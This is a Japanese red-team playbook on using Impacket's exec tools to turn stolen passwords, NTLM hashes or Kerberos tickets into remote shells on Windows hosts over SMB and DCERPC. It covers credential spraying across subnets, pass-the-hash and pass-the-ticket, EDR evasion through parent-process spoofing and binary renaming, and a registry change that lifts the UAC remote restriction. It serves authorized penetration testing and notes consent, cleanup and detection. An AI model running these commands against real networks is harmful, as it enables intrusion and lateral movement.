# Impacket exec ツール群（wmiexec / psexec / smbexec / atexec / dcomexec）

> **スコープ: 135（DCERPC）/ 445（SMB）を介して認証情報（パスワード / NTLM ハッシュ / Kerberos チケット）を対話シェル・コマンド実行に変換する 5 つの経路** を 1 ファイルで扱う。**WinRM（5985 / 5986）が閉じている / 検知回避したい / 横展開連鎖中で WinRM を経由したくない**ときの第一選択。WinRM が開いていれば `./WinRM.md` を優先する。接続後の AD 列挙・横展開は `../04_Post_Access_Windows_AD/Enumeration_Checklist.md` を参照。

## 着火条件

以下のいずれかに該当する場合:

- 管理者相当の認証情報（パスワード / NTLM ハッシュ / Kerberos チケット）が取得済み、かつ **WinRM が閉じている / 接続できない**
- ポートスキャンで `135/tcp open msrpc` または `445/tcp open microsoft-ds` を検出
- `nxc smb [IP] -u [USER] -p [PASSWORD]` で `(Pwn3d!)` 表示を確認済み（一般ユーザーでは本ファイルの手法はすべて失敗する）
- WinRM の検知シグネチャ（`wsmprovhost.exe`）を回避したい（§7 dcomexec で親プロセスを `mmc.exe` / `explorer.exe` 系に変える）
- AD 内 Lateral movement で複数ホストに同じ cred を一斉適用したい（§8）

## 環境前提

- 実行環境: テスター端末（Linux 側を想定）
- 必要なツール:
  - `impacket-wmiexec` / `impacket-psexec` / `impacket-smbexec` / `impacket-atexec` / `impacket-dcomexec`（**Impacket スイート同梱**、ペネトレ用 Linux ディストリ標準搭載 or `pipx install impacket`）
  - `nxc`（NetExec の CLI ラッパー。`(Pwn3d!)` 判定で使う、ペネトレ用 Linux ディストリ標準搭載）
  - Kerberos 経路で `kinit` / `klist`（`krb5-user` パッケージ）
- 外部リソース依存: なし（cred とターゲット IP / FQDN があれば完結）

## 先に確認すること

- **`nxc smb` で `(Pwn3d!)` が出るか**: 出ないユーザー（=管理者でない）では Impacket exec ツール群はすべて失敗する。ADMIN$ 共有書込権 / WMI 呼出権が無いため。`./Default_Credentials.md` / `Credential_Discovery.md` で取得した cred は **必ず先に SMB スプレーで管理者相当を判定**する
- **SMB signing 要件**: `nxc smb [IP]` の出力で `signing:True` が出ているとき NTLM Relay 経路（`../04_Post_Access_Windows_AD/NTLM_Relay/ntlmrelayx.md`）は使えないが、**本ファイルの PTH / Kerberos 経路は signing と独立に動く**
- **ロックアウト設定**: §8 認証スプレーを実施する前に `Account_Lockout_Recon.md` で `lockoutThreshold` / `lockoutObservationWindow` を取得する。SMB の失敗認証も AD カウンタに加算される
- **NTLM 無効化環境**: `STATUS_LOGON_FAILURE` が NTLM 経路で大量に出る環境では §9 Kerberos 経路に切替

> 原理（DCOM / DCERPC / SCM / ATSvc プロトコルモデル・wmiprvse.exe プロセスツリー・各 exec 経路の検知シグネチャ差・Kerberos SPN `cifs/` vs `host/` の使い分け）→ [`../06_Concepts/Impacket_Exec_Internals.md`](../06_Concepts/Impacket_Exec_Internals.md)。WinRM との対比は [`../06_Concepts/WinRM_Protocol.md`](../06_Concepts/WinRM_Protocol.md) §2（wsmprovhost.exe プロセスモデル）も参照。

**攻撃者の思考トレース:** WinRM が「Windows 版 SSH」なら Impacket exec は「Windows 版 ssh + sudo 経由のサービス起動」。**WinRM 5985 / 5986 が閉じていても DC は通常 135 / 445 を開けている** — ドメイン管理者 cred があれば `impacket-wmiexec` で即座にシェルが取れるため「WinRM 閉鎖＝シェル諦め」は誤り。**ファイルレス度・検知性の低さの順は `wmiexec < dcomexec < atexec < smbexec < psexec`**。最初に wmiexec を試し、DCOM 動的ポートが FW で塞がっていたら psexec / smbexec に切替、Defender で即検知される環境なら dcomexec で親プロセスを mmc.exe / explorer.exe に偽装、135 のみが通る環境（445 FW ブロック）なら atexec。**psexec は最後の手段** — SYSTEM 取得は確実だが Event 7045 で必ず検知される。

---

## 1. SMB / DCERPC ポート判定と前提確認

**コマンド:**

```bash
# [Attacker] 135 (DCERPC) / 139 (NetBIOS) / 445 (SMB) の開放確認
nmap -sV -p 135,139,445 [TARGET_IP]

# [Attacker] SMB の詳細情報（signing 要件・OS バージョン・(Pwn3d!) 判定）
nxc smb [TARGET_IP] -u [USER] -p '[PASSWORD]'
# 出力例:
# SMB    [TARGET_IP]    445    [HOSTNAME]    [*] Windows Server 2019 Build 17763 x64 (name:[HOSTNAME]) (domain:example.local) (signing:True) (SMBv1:False)
# SMB    [TARGET_IP]    445    [HOSTNAME]    [+] example.local\[USER]:[PASSWORD] (Pwn3d!)

# [Attacker] DCERPC エンドポイント列挙（Impacket 同梱の rpcdump）
impacket-rpcdump [TARGET_IP]
# どの DCERPC インターフェース（svcctl / wmi / atsvc / drsuapi 等）が利用可能か確認
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `135/tcp open msrpc` | DCERPC 露出 | §3 wmiexec / §6 atexec / §7 dcomexec すべて経路あり |
| `445/tcp open microsoft-ds` | SMB 有効 | §4 psexec / §5 smbexec 経路あり |
| 135 のみ open（445 FW ブロック） | SMB が外部遮断、RPC のみ通る | §6 atexec が第一選択（出力受領用に 445 必要だが、`-no-output` モードで回避可能なツールあり） |
| `signing:True` + `Pwn3d!` | SMB signing 強制、PTH / Kerberos で通る | 本ファイル全経路 OK。NTLM Relay 経路（別ファイル）は使えない |
| `signing:False` + `Pwn3d!` | SMB signing 未強制 | 本ファイル全経路 OK。**追加で NTLM Relay 経路も成立**（`../04_Post_Access_Windows_AD/NTLM_Relay/ntlmrelayx.md`）|
| `SMBv1:True` | 古い OS（Windows Server 2008 以前等） | EternalBlue (MS17-010) 系 CVE も別途検討 |
| `(Pwn3d!)` 表示なし | 認証は通るが管理者でない | **本ファイル全経路失敗** → BloodHound で権限経路を辿る / 別 cred 探索 |

> **`nxc smb (Pwn3d!)` の意味:** ADMIN$ 共有に書込権がある = ローカル Administrators メンバー相当。Impacket psexec は ADMIN$ 書込が必要、wmiexec は WMI 呼出権（既定で Administrators のみ）が必要。**両方とも (Pwn3d!) で判定される。**

> **注意:** `signing:True` でも本ファイル経路は動く（PTH / Kerberos は SMB session key を正しく派生できる）。signing は **Relay 攻撃**（中間者が他人の認証を別ホストに転送する経路）への防御であり、cred 自体を持っている攻撃者には影響しない。

---

## 2. nxc smb による cred 単一判定と (Pwn3d!)

**コマンド:**

```bash
# [Attacker] 単一 cred で (Pwn3d!) 判定
nxc smb [TARGET_IP] -u [USER] -p '[PASSWORD]'

# [Attacker] NTLM ハッシュ
nxc smb [TARGET_IP] -u [USER] -H '[NTLM_HASH]'

# [Attacker] ローカルアカウント指定（ドメイン非参加 / Workgroup 環境）
nxc smb [TARGET_IP] -u [USER] -p '[PASSWORD]' --local-auth

# [Attacker] Kerberos チケット（事前 kinit 必須）
nxc smb [TARGET_FQDN] -u [USER] -k --use-kcache
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `[+] [DOMAIN]\[USER]:... (Pwn3d!)` | 管理者相当 | §3 wmiexec で対話シェル取得 |
| `[+] [DOMAIN]\[USER]:...` のみ（`(Pwn3d!)` なし）| 認証は通るが管理者でない | **本ファイル全経路失敗** → BloodHound / GenericWrite ACE 経由の権限昇格 / 別ユーザー探索 |
| `STATUS_LOGON_FAILURE` | cred 不正 | ドメイン指定 / NetBIOS vs FQDN / Hash 形式の組合せ違いを試行 |
| `STATUS_ACCOUNT_LOCKED_OUT` | ロックアウト発動 | **即停止**、`Account_Lockout_Recon.md` の観察期間で復帰待ち |
| `STATUS_PASSWORD_EXPIRED` | パスワード期限切れ | RDP / 別経路で強制パスワード変更 |
| 接続自体タイムアウト | FW で 445 ブロック | §6 atexec（135 経由）を試す |

> **`--local-auth` の意味:** ターゲットがドメイン参加していない（Workgroup）、またはローカルアカウントで認証したい場合に必要。`[USER]` をローカル SAM データベースで解決する。ドメインユーザー認証時に付けると逆に失敗する。

> **複数 cred のスプレーは §8** で扱う。本ブロックは「取得済み cred 1 件の動作確認」。

---

## 3. wmiexec — WMI / DCOM 経由（最初に試す・最も静か）

**仕組み（要点）:**

1. クライアント → 135 (DCERPC) で `IWbemLevel1Login::NTLMLogin` を呼ぶ
2. DCOM 動的ポート（49152-65535 等）でターゲット側 `wmiprvse.exe` と通信
3. `Win32_Process.Create` メソッドで `cmd.exe /Q /c [COMMAND] 1>\\127.0.0.1\ADMIN$\__[TIMESTAMP] 2>&1` を起動
4. 出力は ADMIN$ 上のテキストファイルに書き出され、クライアントが読み戻す
5. **サービス作成なし・PE バイナリ設置なし** — ファイルレスに最も近い

**コマンド:**

```bash
# [Attacker] パスワード認証（半対話シェル）
impacket-wmiexec '[DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP]'

# [Attacker] Pass-The-Hash 認証
impacket-wmiexec -hashes :[NTLM_HASH] '[DOMAIN]/[USER]@[TARGET_IP]'

# [Attacker] ローカル管理者で認証（Workgroup 環境）
impacket-wmiexec -hashes :[NTLM_HASH] 'Administrator@[TARGET_IP]'

# [Attacker] Kerberos 認証（事前 kinit + KRB5CCNAME 必須）
impacket-wmiexec -k -no-pass '[DOMAIN]/[USER]@[TARGET_FQDN]'

# [Attacker] 1 コマンド一発実行（半対話に入らず・出力受領なし）
impacket-wmiexec -no-output '[DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP]' \
  'powershell -enc [BASE64_ENCODED_COMMAND]'

# [Attacker] 出力受領あり + 1 コマンド実行
impacket-wmiexec '[DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP]' 'whoami /all'

# [Attacker] cwd 変更（既定は C:\）
impacket-wmiexec '[DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP]'
# 半対話シェル内で:
# C:\> cd C:\Users\Administrator\Desktop
# C:\> lcd /tmp     # ローカル側 cwd 変更（get/put 用）
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `[*] SMBv... dialect used` + `C:\>` プロンプト | 半対話シェル取得成功 | コマンド実行 → §10 列挙テンプレ |
| `RPC_E_DISCONNECTED` / 接続後ハング | DCOM 動的ポート（49152-65535）が FW でブロック | §4 psexec / §5 smbexec（445 のみ使用）に切替 |
| `STATUS_LOGON_FAILURE` | cred 不正 / NTLM 無効化 | §2 で再判定 → §9 Kerberos 経路へ |
| `STATUS_ACCESS_DENIED` | 認証は通るが管理者でない | 別 cred / §6 atexec を試す（権限要件が若干緩い場合あり） |
| `WBEM_E_ACCESS_DENIED` | WMI namespace アクセス拒否（DCOM 権限差） | §4 psexec / §5 smbexec へ切替 |
| `KRB_AP_ERR_MODIFIED`（Kerberos 時） | IP 直打ちで SPN 解決不可 | FQDN で接続 + `/etc/hosts` 登録（[`../06_Concepts/Hosts_File_For_AD.md`](../06_Concepts/Hosts_File_For_AD.md)） |

**注意:**

- **半対話シェル制約**: 標準入力をプログラムに渡せない（`type | program` のようなパイプは OK だが、`runas` や対話入力プロンプトを伴うコマンドは動かない）。対話処理が必要なら `evil-winrm`（WinRM）か、PowerShell スクリプトをファイル経由で送って実行
- **出力ファイルが ADMIN$ に残る**: `\\127.0.0.1\ADMIN$\__[TIMESTAMP]` 形式の txt が一時的に書かれて読み戻し後に削除される。**削除に失敗すると残骸**になるため、テスト終了時に `\\[TARGET]\C$\Windows\__*` を確認
- **検知シグネチャ**: Sysmon Event ID 1 で `wmiprvse.exe → cmd.exe` の親子関係が記録される。WMI ロギング（`Microsoft-Windows-WMI-Activity/Operational`）でメソッド呼出も記録
- **`-no-output`** を付けると出力ファイル経由を使わず一発実行のみ → ADMIN$ への書込痕跡が減る（ただし結果が見えない）

---

## 4. psexec — SMB + SCM 経由（確実な SYSTEM・最も検知される）

**仕組み（要点）:**

1. クライアント → 445 (SMB) で IPC$ / ADMIN$ にアクセス
2. **ADMIN$ 共有に PE バイナリ（`RemComSvc.exe`）を書き込む**（Impacket 実装固有の名称。Sysinternals PsExec は `PSEXESVC.exe` を使うが別物）
3. svcctl (DCERPC) でサービス作成 → 起動依頼
4. サービスが SYSTEM 権限で起動し、名前付きパイプ経由で stdin/stdout を中継
5. 切断時にサービス削除・PE 削除（正常終了時のみ）

**コマンド:**

```bash
# [Attacker] パスワード認証 → SYSTEM 対話シェル
impacket-psexec '[DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP]'
# nt authority\system プロンプトが返れば SYSTEM 確定

# [Attacker] Pass-The-Hash
impacket-psexec -hashes :[NTLM_HASH] '[DOMAIN]/Administrator@[TARGET_IP]'

# [Attacker] Kerberos
impacket-psexec -k -no-pass '[DOMAIN]/[USER]@[TARGET_FQDN]'

# [Attacker] サービス名をテスト識別子コメントマーカー方式で指定（原状回復用）
impacket-psexec -service-name 'kedalab-[CASE_ID]' \
  '[DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP]'

# [Attacker] 1 コマンド実行（対話せず）
impacket-psexec '[DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP]' \
  'powershell -enc [BASE64_ENCODED_COMMAND]'

# [Attacker] PE バイナリ名を変更（Defender 回避）
impacket-psexec -remote-binary-name '[CUSTOM_NAME].exe' \
  '[DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP]'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `nt authority\system` プロンプト | SYSTEM 取得成功 | コマンド実行 → §10 列挙テンプレ（SYSTEM なら SAM/LSA dump も即可能）|
| `STATUS_ACCESS_DENIED`（ローカル管理者で接続） | UAC リモート制限（`LocalAccountTokenFilterPolicy=0`）| ドメイン管理者で再実行、または `nxc smb -x 'reg add ...LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f'` で先に解除 |
| `STATUS_SHARING_VIOLATION` | 前回のサービスが残存 / 名前衝突 | `-service-name` 別名で再実行 → 終了後に残存サービス確認 |
| `STATUS_OBJECT_NAME_NOT_FOUND` | ADMIN$ 共有が無効化 | §3 wmiexec / §6 atexec へ |
| Defender でブロック（バイナリ書込時） | RemComSvc が known signature | `-remote-binary-name` で名前変更 / §5 smbexec（バイナリ書込なし）へ |
| サービス起動失敗で残骸 | 接続切断時に削除されなかった | **必ず `sc \\[TARGET] delete [SERVICE_NAME]` で原状回復** |

**注意:**

- **[HIGH IMPACT]** Event ID 7045（サービスインストール）+ Event ID 4697（同）+ ADMIN$ への PE 書込 = **ほぼ確実に EDR で検知される**。本番では Detection Engineering の主要監視対象
- **原状回復必須**: サービス起動失敗時に `kedalab-[CASE_ID]` 名のサービスが残る。`sc \\[TARGET] delete [SERVICE_NAME]` + `\\[TARGET]\ADMIN$\[SERVICE_NAME].exe` 削除
- **`STATUS_ACCESS_DENIED` の罠**: ドメイン管理者ではなく**ローカル管理者**で接続すると UAC リモート制限で拒否される（既定動作）。ドメイン管理者なら通る
- **PE シグネチャ**: Defender 既定で RemComSvc.exe / PSEXESVC.exe 相当が known signature。`-remote-binary-name` で名前を変えてもバイナリ内容で検知される場合あり → §5 smbexec か §3 wmiexec へ

---

## 5. smbexec — SMB + 一時サービス（psexec の代替・バイナリ書込なし）

**仕組み（要点）:**

1. **PE バイナリ書込なし**
2. svcctl で「サービスバイナリ = `cmd.exe /Q /c [COMMAND] > \\127.0.0.1\C$\__output 2>&1`」のサービスを作成・起動
3. 各コマンドごとに毎回サービスを再作成（**コマンドごとに Event 7045 が大量発生**）
4. 出力は `C$\__output` から読み戻し

**コマンド:**

```bash
# [Attacker] パスワード認証（対話シェル）
impacket-smbexec '[DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP]'

# [Attacker] Pass-The-Hash
impacket-smbexec -hashes :[NTLM_HASH] '[DOMAIN]/[USER]@[TARGET_IP]'

# [Attacker] Kerberos
impacket-smbexec -k -no-pass '[DOMAIN]/[USER]@[TARGET_FQDN]'

# [Attacker] サービス名指定（原状回復用マーカー）
impacket-smbexec -service-name 'kedalab-[CASE_ID]' \
  '[DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP]'

# [Attacker] 共有指定（既定 ADMIN$ 以外の共有で出力受領）
impacket-smbexec -share 'C$' '[DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP]'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `C:\>` プロンプト | サービス作成成功 | コマンド実行 |
| `STATUS_OBJECT_NAME_COLLISION` | 前回サービス残存 | `-service-name` 別名 |
| 各コマンドが極端に遅い（数秒〜） | サービス起動オーバーヘッド | wmiexec / atexec で代替 |
| Event 7045 が毎コマンド発生 | **psexec より検知されやすい**（コマンド数 = サービス作成数） | 偵察的に使う場合のみ、本番では非推奨 |

**注意:**

- **ファイルレスだが検知性はむしろ高い**: コマンドごとに新規サービスを作成するため Event 7045 がコマンド回数分だけ発生。`Get-EventLog -LogName System -Source "Service Control Manager"` で時系列に並ぶ
- **stdin が渡せない**: 各コマンドが独立した `cmd.exe /Q /c [COMMAND]` で実行されるため対話入力不可
- **環境変数・cwd が引き継がれない**: コマンド間で `cd` が効かない（毎回独立 cmd）。`cd [DIR] && [COMMAND]` のように 1 行で書く
- **psexec との使い分け**: バイナリ書込が Defender でブロックされる場合の代替 / SYSTEM 取得は psexec / smbexec とも可能

---

## 6. atexec — タスクスケジューラ経由（135 のみで通る・FW 抜け）

**仕組み（要点）:**

1. クライアント → 135 (DCERPC) で **`ITaskSchedulerService`**（新 Task Scheduler API）で task 作成（旧 ATSvc/`IATSvc::NetrJobAdd` は Windows Server 2008 R2 で非推奨化済み。Impacket 実装は `ITaskSchedulerService` にフォールバックする形で動作）
2. task が即実行され、出力は ADMIN$ 上のファイルに書かれる
3. task は自動削除（**ただし Task Scheduler ログには残る**）

**コマンド:**

```bash
# [Attacker] 1 コマンド実行
impacket-atexec '[DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP]' 'whoami /all'

# [Attacker] Pass-The-Hash
impacket-atexec -hashes :[NTLM_HASH] '[DOMAIN]/[USER]@[TARGET_IP]' 'systeminfo'

# [Attacker] Kerberos（SPN は host/[FQDN]）
impacket-atexec -k -no-pass '[DOMAIN]/[USER]@[TARGET_FQDN]' 'whoami'

# [Attacker] PowerShell 1 行実行
impacket-atexec '[DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP]' \
  'powershell -enc [BASE64_ENCODED_COMMAND]'

# [Attacker] task 名を指定（既定はランダム名）
impacket-atexec -task-name 'kedalab-[CASE_ID]' \
  '[DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP]' 'whoami'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 出力が返る（whoami の結果等） | task 作成 → 実行 → 削除完了 | 次のコマンドへ |
| `STATUS_OBJECT_PATH_NOT_FOUND` | ATSvc 未登録（Server 2008+ で要 schtasks）| §3 wmiexec / §7 dcomexec へ |
| 出力なしで終了 | task 登録は通ったが実行未完 / 出力ファイル未作成 | sleep 後に再取得 / コマンド側のエラー（標準エラーが捕捉されない場合あり）|
| `STATUS_ACCESS_DENIED` | Task Scheduler 書込権なし（一般ユーザー） | 別 cred / §3 wmiexec で WMI 経路 |

**注意:**

- **135 のみで完結**（出力受領用に 445 を使うが、`-no-output` で完全に 135 のみで動かせる Impacket バージョンもあり）
- **非対話**: 毎回 1 コマンド実行。半対話シェルなし
- **検知**: Task Scheduler ログ（`Microsoft-Windows-TaskScheduler/Operational`）の Event ID 106（task 登録）/ 200（task 開始）/ 201（task 完了）/ 141（task 削除）が時系列で残る
- **task 名の罠**: 既定でランダム名（`ojvbhasdf` 等）。**`-task-name kedalab-[CASE_ID]` で識別可能にしておく** と原状回復確認が楽
- **既存タスク汚染リスクは低い**（一意名で作成・自動削除）。ただし削除失敗で残骸が出ることはある → `schtasks /query /s [TARGET] /fo list | grep kedalab` で確認

---

## 7. dcomexec — DCOM オブジェクト経由（検知シグネチャ回避用）

**仕組み（要点）:**

- `MMC20.Application.Document.ActiveView.ExecuteShellCommand` / `ShellWindows::Document.Application.ShellExecute` / `ShellBrowserWindow` 等の **既に登録されている DCOM オブジェクトの公開メソッドを叩いて** 間接的にプロセス起動
- 親プロセスが `mmc.exe` / `explorer.exe` / `iexplore.exe` 等になる → **`wmiprvse.exe → cmd.exe` を見ている EDR シグネチャを回避**

**コマンド:**

```bash
# [Attacker] MMC20.Application 経由（既定）
impacket-dcomexec -object MMC20 '[DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP]'

# [Attacker] ShellWindows 経由（親プロセス explorer.exe）
impacket-dcomexec -object ShellWindows '[DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP]'

# [Attacker] ShellBrowserWindow 経由
impacket-dcomexec -object ShellBrowserWindow '[DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP]'

# [Attacker] Pass-The-Hash
impacket-dcomexec -object MMC20 -hashes :[NTLM_HASH] \
  '[DOMAIN]/[USER]@[TARGET_IP]'

# [Attacker] Kerberos
impacket-dcomexec -object MMC20 -k -no-pass \
  '[DOMAIN]/[USER]@[TARGET_FQDN]'

# [Attacker] 1 コマンド一発実行
impacket-dcomexec -object MMC20 '[DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP]' \
  'powershell -enc [BASE64_ENCODED_COMMAND]'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `C:\>` プロンプト | DCOM 経由でプロセス起動成功 | コマンド実行 |
| `MMC20.Application` で `CO_E_SERVER_EXEC_FAILURE` | 対象 OS で MMC20 オブジェクト無効化（Windows 10 1803+ で既定無効） | `ShellWindows` / `ShellBrowserWindow` に切替 |
| すべての DCOM object で失敗 | DCOM 経由 lateral movement が無効化 / `DefaultLaunchPermission` 制限 | §3 wmiexec / §4 psexec へ |
| `STATUS_ACCESS_DENIED` | DCOM access right なし（Administrators 限定）| `(Pwn3d!)` 再確認 |

**注意:**

- **defense evasion 用** — wmiexec / psexec が EDR で即検知される環境での代替経路
- **親プロセス偽装効果**: `wmiprvse → cmd.exe` ではなく `mmc.exe → cmd.exe` / `explorer.exe → cmd.exe` で記録されるため、汎用的な「`wmiprvse` 子プロセス監視」ルールを回避できる。ただし `explorer.exe` 子に `cmd.exe` が並ぶこと自体も別のシグネチャ
- **OS バージョン依存**: MMC20 は Windows 10 1803 以降で既定無効、`ShellWindows` は対話ユーザーがログイン中でないと動かない場合あり → 複数 object をローテーションして試す
- **Defender ASR ルール**: 「Block process creations originating from PSExec and WMI commands」ルールがあると DCOM 経路も巻き添えで検知される場合あり

---

## 8. 認証スプレー連携（Lateral Movement）

**着火条件:** AD 内で同じ cred / hash が複数ホストで通るかを判定し、ヒットしたホスト全てに wmiexec を順次実行したい。

**事前準備（必須）:** `Account_Lockout_Recon.md` で AD のロックアウト閾値（`lockoutThreshold` / `lockoutObservationWindow` / `lockoutDuration`）を取得。SMB の失敗認証も AD カウンタに加算される。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須:
> - [x] 業務停止リスク（アカウントロック発動でユーザーがログイン不能に）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM / EDR で確実に検知される（Event ID 4625 大量・4624 の IpAddress フィールドで接続元 IP 記録、Sysmon の WMI / SCM プロセスチェーン）
>
> 実施可否は事前合意で明示確認すること。演習環境（HTB / OSCP 等）では制約なし。

**コマンド:**

```bash
# [Attacker] (1) 単一 cred を対象レンジに対してスプレー → (Pwn3d!) ホスト抽出
nxc smb 192.0.2.0/24 -u [USER] -p '[PASSWORD]' --continue-on-success | \
  grep '(Pwn3d!)' | awk '{print $2}' > pwned_hosts.txt

# [Attacker] (2) NTLM ハッシュスプレー（PTH の使い回し先探索）
nxc smb 192.0.2.0/24 -u [USER] -H '[NTLM_HASH]' --continue-on-success | \
  grep '(Pwn3d!)' | awk '{print $2}' > pwned_hosts_pth.txt

# [Attacker] (3) ヒットホスト全てに wmiexec で一発コマンド実行
while read ip; do
  echo "=== $ip ==="
  impacket-wmiexec -no-output '[DOMAIN]/[USER]:[PASSWORD]@'$ip 'hostname'
done < pwned_hosts.txt

# [Attacker] (4) nxc 単独でも -x / -X でコマンド実行可能（impacket 不要）
nxc smb 192.0.2.0/24 -u [USER] -p '[PASSWORD]' -x 'whoami /all'    # cmd 実行
nxc smb 192.0.2.0/24 -u [USER] -p '[PASSWORD]' -X '$PSVersionTable' # PowerShell 実行

# [Attacker] (5) ローカルアカウントでスプレー（同じローカル管理者 hash の使い回し検出）
nxc smb 192.0.2.0/24 -u Administrator -H '[LOCAL_NTLM_HASH]' --local-auth --continue-on-success
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 複数ホストで `(Pwn3d!)` | cred の使い回しが広い | 横展開連鎖の対象確定。BloodHound で AD 全体把握 |
| `--local-auth` で複数 ヒット | **同じローカル管理者 hash の使い回し**（LAPS 未導入の典型）| **重大 finding** — ローカル管理者 hash 共通化は AD セキュリティの致命傷 |
| `STATUS_ACCOUNT_LOCKED_OUT` が大量発生 | スプレー設計失敗 | **即停止**、観察期間 +buffer で再設計 |
| 単一 cred で全ホット | cred 1 件で広域ヒット | wmiexec / psexec で次の cred 取得（secretsdump → 連鎖）|

**注意:**

- **`-no-output` を必須にする** — スプレー後に多数ホストへ wmiexec を流すとき、各ホストの ADMIN$ への書込痕跡を抑えられる
- **ローカル管理者 hash の使い回し検出**（`--local-auth`）は AD 環境で最も重要な finding の一つ。LAPS 未導入の組織で典型
- **検知量**: 100 ホストへスプレー = Event 4625 が ~100 件。接続元 IP は 4624 の `IpAddress` フィールドや `Microsoft-Windows-SMBServer/Audit` チャネルに記録される
- **`nxc smb -x` 直接実行**: Impacket exec を経由せず nxc 単独でコマンド実行可能（内部で smbexec 相当 / atexec 相当を呼ぶ）。ホスト数が多いときは nxc -x の方が楽

---

## 9. Kerberos 経路（NTLM 無効化環境）

**着火条件:** §3-§7 のすべてで `STATUS_LOGON_FAILURE` が出るが `kinit` 済み TGT or 別途取得した Service Ticket がある（NTLM 無効化環境 / 防衛的 AD 強化構成）。

**コマンド:**

```bash
# [Attacker] (1) kinit で TGT 取得（パスワード）
kinit [USER]@[DOMAIN.UPPER]
# Password for [USER]@[DOMAIN.UPPER]: ...
klist
# Default principal: [USER]@[DOMAIN.UPPER]
# Valid starting       Expires              Service principal
# ...                  ...                  krbtgt/[DOMAIN.UPPER]@[DOMAIN.UPPER]

# [Attacker] (2) KRB5CCNAME 環境変数にチケットファイル指定
export KRB5CCNAME=/tmp/krb5cc_$(id -u)

# [Attacker] (3) 各 Impacket exec ツールで -k -no-pass を付ける
impacket-wmiexec -k -no-pass '[DOMAIN]/[USER]@[TARGET_FQDN]'
impacket-psexec  -k -no-pass '[DOMAIN]/[USER]@[TARGET_FQDN]'
impacket-smbexec -k -no-pass '[DOMAIN]/[USER]@[TARGET_FQDN]'
impacket-atexec  -k -no-pass '[DOMAIN]/[USER]@[TARGET_FQDN]' 'whoami'
impacket-dcomexec -object MMC20 -k -no-pass '[DOMAIN]/[USER]@[TARGET_FQDN]'

# [Attacker] (4) Pass-The-Ticket — 別途取得した .ccache をインポートして使う
export KRB5CCNAME=/tmp/Administrator.ccache
impacket-wmiexec -k -no-pass 'Administrator@[TARGET_FQDN]'

# [Attacker] (5) Pass-The-Key (AES) — NT hash の代わりに aes256 hash で TGT 取得
impacket-getTGT -aesKey [AES256_KEY] '[DOMAIN]/[USER]@[DC_IP]'
export KRB5CCNAME=[USER].ccache
impacket-wmiexec -k -no-pass '[DOMAIN]/[USER]@[TARGET_FQDN]'

# [Attacker] (6) Overpass-The-Hash — NT hash から TGT を取得して使う
impacket-getTGT -hashes :[NTLM_HASH] '[DOMAIN]/[USER]@[DC_IP]'
export KRB5CCNAME=[USER].ccache
impacket-psexec -k -no-pass '[DOMAIN]/[USER]@[TARGET_FQDN]'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 正常にシェル取得 | Kerberos 経路成功 | §10 列挙テンプレへ |
| `KRB_AP_ERR_MODIFIED` | IP 直打ちで SPN 解決不可 | `[TARGET_FQDN]` に変更 + `/etc/hosts` 登録 |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | SPN がドメインに未登録 | 侵入後 `setspn -L [HOSTNAME]` で確認 / 別ツールへ |
| `KRB_AP_ERR_SKEW`（時刻ずれ）| クライアントと DC の時刻差 > 5 分 | `sudo ntpdate [DC_IP]` で同期 |
| `STATUS_LOGON_FAILURE` が Kerberos でも出る | チケット失効 / ドメイン不一致 | `klist` で valid 確認、`kdestroy` でクリアして再 `kinit` |

**注意:**

- **時刻同期必須**: Kerberos は 5 分以内の clock skew が前提。`sudo ntpdate [DC_IP]` で先に同期
- **SPN プレフィックスがツール別**:
  - wmiexec / dcomexec → `host/[FQDN]` または `HOST/[FQDN]`
  - psexec / smbexec → `cifs/[FQDN]`
  - atexec → `host/[FQDN]`
  - **既に登録済みの SPN しか使えない** ため、対象 SPN が無い環境では失敗。`setspn -T [DOMAIN] -Q */*` で全 SPN 列挙して確認
- **`[TARGET_FQDN]` 必須**: IP で接続すると Kerberos client が SPN を構築できず `KRB_AP_ERR_MODIFIED`。`/etc/hosts` 登録が前提（[`../06_Concepts/Hosts_File_For_AD.md`](../06_Concepts/Hosts_File_For_AD.md)）
- **`KRB5CCNAME` を必ず設定**: 環境変数を export し忘れると `getTGT` で作った ccache を使ってくれない（無言で別チケット試行 → 失敗）

---

## 10. 接続後すぐに実行する列挙コマンド（共通テンプレ）

§3-§7 のいずれで対話シェルを取得した場合も、接続直後に以下を実行して状況確認する：

```cmd
:: [Target] cmd.exe 上で
whoami
whoami /all
whoami /priv
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Domain"
net user
net user [USER]
net localgroup Administrators
net localgroup "Remote Management Users"
ipconfig /all
arp -a
